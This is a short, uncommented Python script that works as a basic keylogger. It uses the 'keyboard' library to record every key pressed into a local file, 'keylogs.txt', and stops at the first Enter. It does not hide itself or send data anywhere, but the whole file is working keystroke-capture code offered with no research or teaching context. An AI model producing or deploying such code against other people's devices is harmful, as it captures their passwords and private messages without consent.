import keyboard

output_file = "keylogs.txt"

def save_to_file(event):
    with open(output_file, "a") as f:
        key = event.name
        if key == "space":
            f.write(" ")
        elif key == "enter":
            f.write("\n")
        elif key == "backspace":
            f.write("<BACKSPACE>")
        else:
            f.write(key)

keyboard.on_press(save_to_file)
keyboard.wait("enter")
